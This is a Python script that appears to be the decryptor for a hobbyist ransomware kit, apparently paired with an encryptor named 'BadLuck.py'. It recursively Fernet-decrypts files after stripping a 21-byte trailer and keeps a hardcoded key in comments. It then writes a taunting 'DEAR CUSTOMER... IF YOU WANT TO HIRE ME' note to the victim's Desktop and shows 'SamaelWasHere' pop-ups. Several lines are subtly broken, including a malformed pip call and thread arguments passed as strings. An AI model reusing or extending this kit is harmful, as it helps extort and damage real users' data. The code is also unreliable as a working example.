import os,requests,sys,subprocess
from pathlib import Path
import winsound
import threading
from tkinter import * 
from tkinter import messagebox 

try:
    import hashlib
except ModuleNotFoundError:
    subprocess.check_call([sys.executable , "-m" , "pip install" , "hashlib"])
    import hashlib
try:
    from cryptography.fernet import Fernet
except ModuleNotFoundError:
    subprocess.check_call([sys.executable , "-m" , "pip install" , "cryptography"])
    from cryptography.fernet import Fernet

def make_noise(n):
  #duration = n  # milliseconds
  s = int(n)
  freq = 550  # Hz
  for i in range(s):
      winsound.Beep(freq, 1000)
      winsound.Beep(freq+150, 1000)


def main_dec(key):
    cwd1 = os.getcwd()
    files = []
    global excep_count
    excep_count = 0
    def writefilenames():
        global excep_count
        try:
            for file in os.listdir():
                if file=='BadLuck.py' or file=='GoodLuck.py' or file=='$RECYCLE.BIN':
                    continue
                elif os.path.isfile(file):
                    temp = os.getcwd()
                    files.append(os.path.join(temp,file))
                elif os.path.isdir(file):
                    temp = os.getcwd()
                    os.chdir(os.path.join(temp,file))
                    writefilenames()
                    os.chdir(temp)
        except : 
            excep_count += 1
    writefilenames()
    print(files)
    

    #key = Fernet.generate_key()
    # key=b'37P6Ce5p1GkCELGoEWRDBgRd_GYf7iwoV2FFG1PuEug='
    try:
        for file in files:
            with open(file,'rb') as curfile:
                data = curfile.read()[:-21]
                curfile.close()
            dec_data = Fernet(key).decrypt(data)
            with open(file,'wb') as f:
                f.write(dec_data)
                f.close()
    except:
        excep_count += 1
    print(excep_count)
def readme(aname):
    cwd = os.getcwd()
    usrname = subprocess.run('whoami',capture_output=True,text=True)
    usrname = usrname.stdout[:-1]
    uname = usrname.split(sep='\\')[1] 
    path = f"C:\\Users\\{uname}\\Desktop\\"
    os.chdir(path)
    with open("README.md",'a') as f:
        f.truncate(00)
        f.write(f'''YOU ARE SAFE NOW DEAR CUSTOMER {uname}.\nIT WAS GREAT WORKING WITH YOU.\nIF YOU WANT TO HIRE ME SOMEDAY YOU KNOW WHERE TO CONTACT!!\n\n\nYours Truly,\n\t{aname}\n\n\n\n###SamaelWasHere <^^>/###''')
        f.close()
    
def msgbox():   
    text = "###ALL THE FILES HAVE BEEN DECRYPTED AND READ 'README.md' FILE FOR FURTHER INFORMATION.\nBy yours truly ~~Samael <^^>/###"
    messagebox.showerror("Anti-Ransomeware Executed Successfully", text)
     

def repeatbox():
    root = Tk() 
    root.geometry("300x100") 
      
    w = Label(root, text ='\n\n~~SamaelWasHere<^^>', font = "50")  
    w.pack()
    root.mainloop()  
    c=0
    while c<1:
        msgbox()
        c+=1
        

#Main thread start:
# key=b'37P6Ce5p1GkCELGoEWRDBgRd_GYf7iwoV2FFG1PuEug='
# aname = 'Samael'
# t1 = threading.Thread(target=make_noise,args=('3'))
# t2 = threading.Thread(target=main_dec,args=(key))
# t4 = threading.Thread(target=readme,args=(aname))
# t3 = threading.Thread(target=repeatbox)
# t2.start()
# t2.join()
# t1.start()
# t4.start()
# t4.join()
# t3.start()

